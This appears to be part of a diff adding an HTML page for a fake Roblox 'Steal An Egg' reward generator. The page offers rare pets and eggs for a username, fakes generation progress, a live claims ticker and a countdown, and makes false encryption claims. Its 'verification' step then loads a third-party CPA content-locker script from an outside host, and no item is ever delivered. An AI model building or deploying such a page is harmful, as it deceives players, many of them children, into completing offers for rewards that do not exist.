+                  id="success-item-name"
+                  class="text-transparent bg-clip-text bg-gradient-to-r from-indigo-300 via-indigo-200 to-rose-300"
+                  >Item</span
+                >
+              </h3>
+              <p
+                class="text-slate-300 text-xs leading-relaxed max-w-sm mx-auto"
+              >
+                <span>is reserved for </span
+                ><span
+                  id="success-username"
+                  class="text-yellow-400 font-extrabold font-mono px-1.5 py-0.5 bg-yellow-950/40 rounded border border-yellow-500/30"
+                  >User</span
+                >. Complete the quick human verification step below to receive
+                your item in your Roblox inventory.
+              </p>
+            </div>
+
+            <div
+              class="relative w-32 h-32 mx-auto flex items-center justify-center rounded-3xl p-4 border border-white/10 bg-indigo-600/10 shadow-[0_0_40px_rgba(6,182,212,0.35)]"
+            >
+              <img
+                id="success-item-img"
+                src=""
+                alt=""
+                class="w-24 h-24 object-contain filter drop-shadow-xl animate-float"
+              />
+            </div>
+
+            <button
+              onclick="triggerVerification()"
+              class="w-full py-4 rounded-2xl btn-gradient text-white font-black uppercase tracking-wider text-sm flex items-center justify-center gap-3 border border-white/25 shadow-[0_0_35px_rgba(6,182,212,0.5)] cursor-pointer"
+            >
+              <svg
+                class="w-5 h-5 text-white"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  stroke-width="2.5"
+                  d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
+                />
+              </svg>
+              <span id="txt-verifyClaim">Verify & Claim Now</span>
+            </button>
+
+            <div
+              class="flex items-center justify-center gap-2 text-xs font-bold text-slate-400 font-mono"
+            >
+              <span>Reservation expires in</span>
+              <span
+                id="countdown-timer"
+                class="text-indigo-400 font-extrabold bg-indigo-500/10 px-2 py-0.5 rounded border border-indigo-500/20"
+                >05:00</span
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Scripts & Data -->
+    <script>
+      const CONFIG_LOCKER = {
+        it: 4529624,
+        key: "f32ee",
+        scriptUrl: "https://d1g1lhd4vferpn.cloudfront.net/c362b64.js",
+        directLink: "https://d1g1lhd4vferpn.cloudfront.net/c362b64",
+      };
+
+      const REWARDS_DATA = [
+        {
+          id: "arch_angel",
+          name: "Arch Angel",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/6/60/ArchAngel.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+8,500% Power",
+          desc: "Radiant heavenly guardian wielding sacred judgment light.",
+        },
+        {
+          id: "world_burner",
+          name: "World Burner",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/f/fe/World_Burner.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+9,200% Power",
+          desc: "Apocalyptic flame titan that scorches entire realms.",
+        },
+        {
+          id: "skeleton_horse",
+          name: "Skeleton Horse",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/d/de/Skeleton_Horse.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+6,800% Power",
+          desc: "Undead spectral stallion galloping beyond the grave.",
+        },
+        {
+          id: "pegasus",
+          name: "Pegasus",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/3/36/Eternal_Pegasus.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+7,800% Speed",
+          desc: "Majestic winged equine soaring through celestial skies.",
+        },
+        {
+          id: "shattered_colossus",
+          name: "Shattered Colossus",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/a/a4/Shattered_Colossus.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+6,400% Power",
+          desc: "Ancient crystalline guardian imbued with tectonic resonance.",
+        },
+        {
+          id: "shattered_drake",
+          name: "Shattered Drake",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/c/ce/Shattered_Drake.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+7,000% Power",
+          desc: "Fractured crystal drake pulsing with geomantic shards.",
+        },
+        {
+          id: "world_eater",
+          name: "World Eater",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/4/40/World_Eater.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+10,500% Power",
+          desc: "Omnivorous cosmic devourer consuming everything in its path.",
+        },
+        {
+          id: "mecha_dreadscale",
+          name: "Mecha Dreadscale",
+          img: "https://eggblox.pages.dev/images/mecha_dreadscale.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+9,500% Power",
+          desc: "Cybernetic draconic titan with devastating egg stealing velocity.",
+        },
+        {
+          id: "dreadscale",
+          name: "Dreadscale",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/3/3b/Dreadscale.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+8,800% Power",
+          desc: "Mythical primordial beast with ferocious hatching speed.",
+        },
+        {
+          id: "mecha_krakenoid",
+          name: "Mecha Krakenoid",
+          img: "https://static.wikia.nocookie.net/stealanegg/images/1/1b/Mecha_Krakenoid.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+12,000% Power",
+          desc: "Abyssal mechanical terror wielding eight laser tentacles.",
+        },
+        {
+          id: "eternal_lunar_dragon",
+          name: "Eternal Lunar Dragon",
+          img: "https://eggblox.pages.dev/images/eternal_lunar_dragon.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+11,000% Power",
+          desc: "Moonlight-infused dragon channeling eternal eclipse energy.",
+        },
+        {
+          id: "divine_trail",
+          name: "Divine Trail",
+          img: "https://eggblox.pages.dev/images/divine_trail.png",
+          category: "trail",
+          rarity: "Divine",
+          multiplier: "+5,000% Multiplier",
+          desc: "Golden particle aura that leaves opponents in total awe.",
+        },
+        {
+          id: "secret_t_rex",
+          name: "Secret T-Rex",
+          img: "https://eggblox.pages.dev/images/secret_t_rex.png",
+          category: "pet",
+          rarity: "Secret",
+          multiplier: "+11,500% Power",
+          desc: "Unmatched Jurassic apex predator with bone-crushing jaws.",
+        },
+        {
+          id: "eternal_mosasaurus",
+          name: "Eternal Mosasaurus",
+          img: "https://eggblox.pages.dev/images/eternal_mosasaurus.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+18,000% Power",
+          desc: "Primeval aquatic leviathan capable of swallowing entire islands.",
+        },
+        {
+          id: "divine_unicorn",
+          name: "Divine Unicorn",
+          img: "https://eggblox.pages.dev/images/divine_unicorn.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+7,500% Luck",
+          desc: "Enchanted celestial equine emitting prismatic rainbows.",
+        },
+        {
+          id: "cosmic_dragon",
+          name: "Cosmic dragon",
+          img: "https://eggblox.pages.dev/images/cosmic_dragon.png",
+          category: "pet",
+          rarity: "Divine",
+          multiplier: "+20,000% Power",
+          desc: "Stellar constellation incarnation with superluminal breath.",
+        },
+        {
+          id: "divine_egg",
+          name: "Divine Egg",
+          img: "https://eggblox.pages.dev/images/divine_egg.png",
+          category: "egg",
+          rarity: "Divine",
+          multiplier: "High Divine Chance",
+          desc: "Radiant golden shell wrapped in heavenly sacred seals.",
+        },
+        {
+          id: "eternal_egg",
+          name: "Eternal Egg",
+          img: "https://eggblox.pages.dev/images/eternal_egg.png",
+          category: "egg",
+          rarity: "Secret",
+          multiplier: "Guaranteed Eternal",
+          desc: "Rare relic forged at the cosmic origin of the universe.",
+        },
+        {
+          id: "secret_egg",
+          name: "Secret Egg",
+          img: "https://eggblox.pages.dev/images/eternal_egg.png",
+          category: "egg",
+          rarity: "Secret",
+          multiplier: "Classified Loot",
+          desc: "Mysterious shrouded egg humming with hidden energy.",
+        },
+        {
+          id: "angelic_treadmill",
+          name: "Angelic Treadmill",
+          img: "https://eggblox.pages.dev/images/angelic_treadmill.png",
+          category: "egg",
+          rarity: "Divine",
+          multiplier: "Guaranteed Tier 5",
+          desc: "Pulsing dimensional fissure containing anomalous creatures.",
+        },
+        {
+          id: "kitsune",
+          name: "Kitsune",
+          img: "https://eggblox.pages.dev/images/kitsune.png",
+          category: "egg",
+          rarity: "Divine",
+          multiplier: "+8,200% Luck",
+          desc: "Nine-tailed legendary spirit granting boundless fortune.",
+        },
+        {
+          id: "nightflame",
+          name: "Nightflame",
+          img: "https://eggblox.pages.dev/images/nightflame.png",
+          category: "egg",
+          rarity: "Divine",
+          multiplier: "+5,800% Power",
+          desc: "Dark matter specter cloaked in incandescent indigo flames.",
+        },
+        {
+          id: "nightflame_egg",
+          name: "Nightflame Egg",
+          img: "https://eggblox.pages.dev/images/nightflame_egg.png",
+          category: "egg",
+          rarity: "Divine",
+          multiplier: "High Divine Chance",
+          desc: "Smoldering egg crackling with indigo dark flames.",
+        },
+        {
+          id: "gorilla_king_egg",
+          name: "Gorilla King Egg",
+          img: "https://eggblox.pages.dev/images/gorilla_king_egg.png",
+          category: "egg",
+          rarity: "Divine",
+          multiplier: "Guaranteed Divine",
+          desc: "Jungle sovereign egg echoing with primal roars.",
+        },
+      ];
+
+      const RARITY_THEMES = {
+        Divine: {
+          badge: "bg-black/25 text-white border-white/30",
+          bg: "from-[#8093f7] via-[#7285f2] to-[#6376ea]",
+          border:
+            "border-white/50 hover:border-yellow-300 hover:shadow-[0_0_25px_rgba(250,204,21,0.4)]",
+          icon: "👑",
+        },
+        Secret: {
+          badge: "bg-black/25 text-white border-white/30",
+          bg: "from-[#8093f7] via-[#7285f2] to-[#6376ea]",
+          border:
+            "border-white/50 hover:border-yellow-300 hover:shadow-[0_0_25px_rgba(250,204,21,0.4)]",
+          icon: "🔥",
+        },
+        Eternal: {
+          badge: "bg-black/25 text-white border-white/30",
+          bg: "from-[#8093f7] via-[#7285f2] to-[#6376ea]",
+          border:
+            "border-white/50 hover:border-yellow-300 hover:shadow-[0_0_25px_rgba(250,204,21,0.4)]",
+          icon: "💎",
+        },
+        Cosmic: {
+          badge: "bg-black/25 text-white border-white/30",
+          bg: "from-[#8093f7] via-[#7285f2] to-[#6376ea]",
+          border:
+            "border-white/50 hover:border-yellow-300 hover:shadow-[0_0_25px_rgba(250,204,21,0.4)]",
+          icon: "✨",
+        },
+      };
+
+      const TRANSLATIONS = {
+        en: {
+          subtitle: "Steal An Egg • Live Rewards Hub",
+          heroTitle1: "Unlock Exclusive",
+          heroTitle2: "Eggs & Pets",
+          claimNow: "Claim Reward",
+          liveClaims: "Live claims:",
+          today: "today",
+          playersClaiming: "Roblox players currently claiming rewards",
+          freeDrop: "Free Instant Drop",
+          enterUsername:
+            "Enter your Roblox username to start generating your selected reward.",
+          usernamePlaceholder: "Your Roblox username (e.g. GamerPro_99)",
+          generateNow: "Generate Reward",
+          secureNote: "SSL 256-Bit Encrypted • No password ever required",
+          verifyClaim: "Verify & Claim Now",
+          claimButton: "Claim",
+        },
+        es: {
+          subtitle: "Steal An Egg • Centro de Recompensas",
+          heroTitle1: "Desbloquea Tus",
+          heroTitle2: "Huevos y Mascotas",
+          claimNow: "Reclamar Recompensa",
+          liveClaims: "Reclamos en vivo:",
+          today: "hoy",
+          playersClaiming: "Jugadores de Roblox reclamando ahora mismo",
+          freeDrop: "Drop Instantáneo Gratis",
+          enterUsername:
+            "Ingresa tu nombre de usuario de Roblox para comenzar a generar tu recompensa.",
+          usernamePlaceholder: "Tu usuario Roblox (ej. GamerPro_99)",
+          generateNow: "Generar Recompensa",
+          secureNote: "Encriptación SSL 256-Bit • Nunca pedimos contraseña",
+          verifyClaim: "Verificar y Reclamar Ahora",
+          claimButton: "Reclamar",
+        },
+        fr: {
+          subtitle: "Steal An Egg • Hub Récompenses",
+          heroTitle1: "Débloquez Vos",
+          heroTitle2: "Œufs & Animaux",
+          claimNow: "Réclamer",
+          liveClaims: "Réclamations en direct:",
+          today: "aujourd'hui",
+          playersClaiming: "Joueurs Roblox en train de réclamer",
+          freeDrop: "Drop Gratuit Immédiat",
+          enterUsername:
+            "Entrez votre pseudo Roblox pour générer votre récompense.",
+          usernamePlaceholder: "Votre pseudo Roblox (ex: GamerPro_99)",
+          generateNow: "Générer la Récompense",
+          secureNote: "Chiffrement SSL 256-Bit • Aucun mot de passe requis",
+          verifyClaim: "Vérifier & Réclamer",
+          claimButton: "Réclamer",
+        },
+        pt: {
+          subtitle: "Steal An Egg • Central de Recompensas",
+          heroTitle1: "Desbloqueie Seus",
+          heroTitle2: "Ovos & Pets",
+          claimNow: "Resgatar",
+          liveClaims: "Resgates ao vivo:",
+          today: "hoje",
+          playersClaiming: "Jogadores resgatando itens neste momento",
+          freeDrop: "Drop Gratuito Instantâneo",
+          enterUsername:
+            "Digite seu nome de usuário do Roblox para gerar sua recompensa.",
+          usernamePlaceholder: "Seu nome de usuário Roblox",
+          generateNow: "Gerar Recompensa",
+          secureNote: "Criptografia SSL 256-Bit • Nunca pedimos senha",
+          verifyClaim: "Verificar e Resgatar",
+          claimButton: "Resgatar",
+        },
+        ar: {
+          subtitle: "ستيل أن إيغ • مركز المكافآت الحصري",
+          heroTitle1: "احصل على أندر",
+          heroTitle2: "البيض والحيوانات",
+          claimNow: "المطالبة الآن",
+          liveClaims: "المطالبات المباشرة:",
+          today: "اليوم",
+          playersClaiming: "لاعبين يطالبون بجوائزهم في هذه اللحظة",
+          freeDrop: "سحب مجاني فوري",
+          enterUsername: "أدخل اسم مستخدم روبلوكس لبدء توليد مكافأتك.",
+          usernamePlaceholder: "اسم مستخدم روبلوكس الخاص بك",
+          generateNow: "توليد المكافأة الآن",
+          secureNote: "تشفير SSL 256-Bit • لا نطلب كلمة المرور أبداً",
+          verifyClaim: "تحقق واستلم المكافأة الآن",
+          claimButton: "مطالبة",
+        },
+        tl: {
+          subtitle: "Steal An Egg • Hub ng Libreng Rewards",
+          heroTitle1: "I-unlock ang",
+          heroTitle2: "Eggs & Pets",
+          claimNow: "I-claim ang Reward",
+          liveClaims: "Live claims:",
+          today: "ngayon",
+          playersClaiming: "Roblox players na kumukuha ng rewards ngayon",
+          freeDrop: "Libreng Instant Drop",
+          enterUsername:
+            "Ilagay ang iyong Roblox username para simulan ang pag-generate.",
+          usernamePlaceholder: "Iyong Roblox username",
+          generateNow: "I-generate ang Reward",
+          secureNote: "SSL 256-Bit Encrypted • Hindi kailangan ng password",
+          verifyClaim: "I-verify at I-claim Ngayon",
+          claimButton: "I-claim",
+        },
+      };
+
+      let currentLang = "en";
+      let currentCategory = "all";
+      let selectedReward = null;
+      let countdownInterval = null;
+
+      function renderRewards() {
+        const grid = document.getElementById("rewards-grid");
+        const rarity = document.getElementById("rarity-filter").value;
+        grid.innerHTML = "";
+
+        const filtered = REWARDS_DATA.filter((item) => {
+          if (currentCategory !== "all" && item.category !== currentCategory)
+            return false;
+          if (rarity !== "all" && item.rarity !== rarity) return false;
+          return true;
+        });
+
+        if (filtered.length === 0) {
+          grid.innerHTML = `<div class="col-span-full py-16 text-center text-slate-400">No items match your filter.</div>`;
+          return;
+        }
+
+        filtered.forEach((reward) => {
+          const theme = RARITY_THEMES[reward.rarity];
+          const card = document.createElement("div");
+          card.className = `group relative flex flex-col rounded-2xl p-4 sm:p-5 border transition-all duration-300 cursor-pointer bg-gradient-to-b ${theme.bg} ${theme.border} card-hover select-none`;
+          card.onclick = () => openClaimModal(reward);
+          card.innerHTML = `
+                    <div class="flex items-center justify-between gap-2 mb-3">
+                        <span class="inline-flex items-center gap-1.5 px-2.5 py-1 text-[10px] font-black tracking-wider uppercase rounded-lg border ${theme.badge}">
+                            <span>${theme.icon}</span><span>${reward.rarity}</span>
+                        </span>
+                        <span class="font-mono text-[10px] uppercase text-white bg-black/25 px-2 py-0.5 rounded border border-white/25 font-semibold">${reward.category}</span>
+                    </div>
+                    <div class="relative flex-1 flex items-center justify-center min-h-[140px] my-2">
+                        <img src="${reward.img}" alt="${reward.name}" class="max-h-28 sm:max-h-32 max-w-[85%] object-contain filter drop-shadow-[0_10px_20px_rgba(0,0,0,0.6)] group-hover:scale-110 transition-transform duration-300 pointer-events-none">
+                    </div>
+                    <div class="space-y-1.5 mb-3 text-center">
+                        <h3 class="text-sm sm:text-base font-extrabold text-white truncate">${reward.name}</h3>
+                        <div class="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-black/25 border border-white/25 text-[10px] font-mono text-yellow-300 font-bold">
+                            ⚡ <span>${reward.multiplier}</span>
+                        </div>
+                    </div>
+                    <button class="w-full py-2.5 px-3 rounded-xl btn-gradient text-white text-xs font-black uppercase tracking-wider flex items-center justify-center gap-1 border border-white/20">
+                        <span>${TRANSLATIONS[currentLang].claimButton}</span> &rarr;
+                    </button>
+                `;
+          grid.appendChild(card);
+        });
+      }
+
+      function setCategory(cat) {
+        currentCategory = cat;
+        document.querySelectorAll(".cat-btn").forEach((btn) => {
+          btn.className =
+            "cat-btn flex items-center gap-2 px-4 py-2 rounded-xl text-xs sm:text-sm font-bold bg-white/[0.03] text-slate-300 border border-white/[0.08] hover:bg-white/[0.07] cursor-pointer";
+        });
+        const activeBtn = document.getElementById(`cat-btn-${cat}`);
+        if (activeBtn) {
+          activeBtn.className =
+            "cat-btn flex items-center gap-2 px-4 py-2 rounded-xl text-xs sm:text-sm font-bold bg-indigo-600 text-white border border-indigo-400 shadow-[0_0_15px_rgba(6,182,212,0.4)] cursor-pointer";
+        }
+        renderRewards();
+      }
+
+      function handleFilter() {
+        renderRewards();
+      }
+
+      function scrollToRewards() {
+        document
+          .getElementById("rewards-section")
+          .scrollIntoView({ behavior: "smooth" });
+      }
+
+      function changeLanguage(lang) {
+        currentLang = lang;
+        const t = TRANSLATIONS[lang];
+        document.documentElement.dir = lang === "ar" ? "rtl" : "ltr";
+        document.getElementById("txt-subtitle").innerText = t.subtitle;
+        document.getElementById("txt-heroTitle1").innerText = t.heroTitle1;
+        document.getElementById("txt-heroTitle2").innerText = t.heroTitle2;
+        document.getElementById("txt-claimNow").innerText = t.claimNow;
+        document.getElementById("txt-liveClaims").innerText = t.liveClaims;
+        document.getElementById("txt-today").innerText = t.today;
+        document.getElementById("txt-playersClaiming").innerText =
+          t.playersClaiming;
+        document.getElementById("txt-freeDrop").innerText = t.freeDrop;
+        document.getElementById("txt-enterUsername").innerText =
+          t.enterUsername;
+        document.getElementById("username-field").placeholder =
+          t.usernamePlaceholder;
+        document.getElementById("txt-generateNow").innerText = t.generateNow;
+        document.getElementById("txt-secureNote").innerText = t.secureNote;
+        document.getElementById("txt-verifyClaim").innerText = t.verifyClaim;
+        renderRewards();
+      }
+
+      function openClaimModal(reward) {
+        selectedReward = reward;
+        document.getElementById("selected-item-img").src = reward.img;
+        document.getElementById("selected-item-name").innerText = reward.name;
+        document.getElementById("selected-item-desc").innerText = reward.desc;
+        document.getElementById("selected-item-rarity").innerText =
+          reward.rarity;
+        document.getElementById("selected-item-multiplier").innerText =
+          reward.multiplier;
+        document.getElementById("progress-item-img").src = reward.img;
+        document.getElementById("success-item-img").src = reward.img;
+        document.getElementById("success-item-name").innerText = reward.name;
+        document.getElementById("username-field").value = "";
+        document.getElementById("username-error").classList.add("hidden");
+
+        showPanel("input");
+        document.getElementById("claim-modal").classList.remove("hidden");
+        preloadLocker();
+      }
+
+      function closeModal() {
+        document.getElementById("claim-modal").classList.add("hidden");
+        if (countdownInterval) clearInterval(countdownInterval);
+      }
+
+      function showPanel(panelName) {
+        ["input", "progress", "success"].forEach((p) => {
+          document
+            .getElementById(`panel-${p}`)
+            .classList.toggle("hidden", p !== panelName);
+        });
+      }
+
+      function startProcessing() {
+        const username = document.getElementById("username-field").value.trim();
+        if (!username) {
+          document.getElementById("username-error").classList.remove("hidden");
+          return;
+        }
+        document.getElementById("username-error").classList.add("hidden");
+        document.getElementById("success-username").innerText = username;
+        showPanel("progress");
+
+        let progress = 0;
+        const bar = document.getElementById("progress-bar-fill");
+        const pct = document.getElementById("progress-pct");
+
+        const interval = setInterval(() => {
+          progress += 1;
+          bar.style.width = `${progress}%`;
+          pct.innerText = `${progress}%`;
+
+          if (progress === 25) activateStep(2);
+          if (progress === 55) activateStep(3);
+          if (progress === 85) activateStep(4);
+
+          if (progress >= 100) {
+            clearInterval(interval);
+            setTimeout(() => {
+              showPanel("success");
+              startCountdown();
+              triggerConfetti();
+            }, 400);
+          }
+        }, 45);
+      }
+
+      function activateStep(num) {
+        const row = document.getElementById(`step-row-${num}`);
+        const icon = document.getElementById(`step-icon-${num}`);
+        if (row && icon) {
+          row.classList.remove("opacity-40", "border-transparent");
+          row.classList.add(
+            "bg-white/[0.03]",
+            "border-white/[0.1]",
+            "text-slate-200"
+          );
+          icon.innerHTML = `<span class="w-2 h-2 rounded-full bg-indigo-400 animate-ping"></span>`;
+        }
+      }
+
+      function startCountdown() {
+        let left = 300;
+        const label = document.getElementById("countdown-timer");
+        if (countdownInterval) clearInterval(countdownInterval);
+        countdownInterval = setInterval(() => {
+          left--;
+          if (left <= 0) {
+            clearInterval(countdownInterval);
+            label.innerText = "00:00";
+            return;
+          }
+          const m = Math.floor(left / 60);
+          const s = left % 60;
+          label.innerText = `0${m}:${s < 10 ? "0" : ""}${s}`;
+        }, 1000);
+      }
+
+      function preloadLocker() {
+        window.oDOek_kVe_NBgsPc = {
+          it: CONFIG_LOCKER.it,
+          key: CONFIG_LOCKER.key,
+        };
+        const scriptFilename = CONFIG_LOCKER.scriptUrl.substring(
+          CONFIG_LOCKER.scriptUrl.lastIndexOf("/") + 1
+        );
+        if (!document.querySelector(`script[src*="${scriptFilename}"]`)) {
+          const s = document.createElement("script");
+          s.type = "text/javascript";
+          s.src = CONFIG_LOCKER.scriptUrl;
+          s.async = true;
+          document.body.appendChild(s);
+        }
+      }
+
+      function triggerVerification() {
+        window.oDOek_kVe_NBgsPc = {
+          it: CONFIG_LOCKER.it,
+          key: CONFIG_LOCKER.key,
+        };
+        if (typeof CPABuildLock === "function") {
+          CPABuildLock();
+        } else if (typeof call_locker === "function") {
+          call_locker();
+        } else {
+          window.open(CONFIG_LOCKER.directLink, "_blank");
+        }
+      }
+
+      function initLiveTicker() {
+        const users = [
+          "Rival_Destroyer",
+          "Noah_YT",
+          "Zenix_07",
+          "GamerGirl_Mia",
+          "DarkKnight",
+          "Ethan_Rbx",
+          "ProSniper",
+          "BloxGod",
+          "AlphaWolf",
+        ];
+        const items = [
+          "Arch Angel",
+          "World Burner",
+          "Mecha Dreadscale",
+          "World Eater",
+          "Eternal Lunar Dragon",
+          "Kitsune",
+        ];
+        const ticker = document.getElementById("live-ticker-inner");
+        const data = Array.from({ length: 12 }).map((_, i) => ({
+          user:
+            users[Math.floor(Math.random() * users.length)] +
+            Math.floor(Math.random() * 90 + 10),
+          item: items[Math.floor(Math.random() * items.length)],
+        }));
+        const list = [...data, ...data];
+        ticker.innerHTML = list
+          .map(
+            (c) => `
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/[0.025] border border-white/[0.06] text-xs">
+                    <span class="font-mono text-indigo-300 font-semibold">${c.user}</span>
+                    <span class="text-slate-500 text-[10px]">unlocked</span>
+                    <span class="text-white font-extrabold">${c.item}</span>
+                </div>
+            `
+          )
+          .join("");
+      }
+
+      function triggerConfetti() {
+        const canvas = document.getElementById("confetti-canvas");
+        if (!canvas) return;
+        const ctx = canvas.getContext("2d");
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const colors = ["#818cf8", "#f87171", "#facc15", "#ffffff"];
+        const particles = Array.from({ length: 60 }).map(() => ({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height - canvas.height,
+          r: Math.random() * 5 + 3,
+          d: Math.random() * canvas.height,
+          color: colors[Math.floor(Math.random() * colors.length)],
+          tilt: Math.random() * 10 - 5,
+        }));
+        function draw() {
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+          particles.forEach((p) => {
+            p.y += 4;
+            ctx.beginPath();
+            ctx.lineWidth = p.r;
+            ctx.strokeStyle = p.color;
+            ctx.moveTo(p.x + p.tilt, p.y);
+            ctx.lineTo(p.x + p.tilt + p.r, p.y + p.r);
+            ctx.stroke();
+          });
+        }
+        let frames = 0;
+        const anim = setInterval(() => {
+          draw();
+          frames++;
+          if (frames > 120) {
+            clearInterval(anim);
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+          }
+        }, 30);
+      }
+
+      // Init
+      renderRewards();
+      initLiveTicker();
+    </script>
+  </body>
+</html>
+<script
+  async
+  src="/.netlify/scripts/hud?variant=public"
+  data-nf-variant="public"
+  data-netlify-site-id="c62ae1c0-552e-4a0e-80f6-73a4bfd214d3"
+  data-app-host="app.netlify.com"
+></script>
+<script
+  async
+  src="/.netlify/scripts/hud?variant=public"
+  data-nf-variant="public"
+  data-netlify-site-id="c62ae1c0-552e-4a0e-80f6-73a4bfd214d3"
+  data-app-host="app.netlify.com"
+></script>
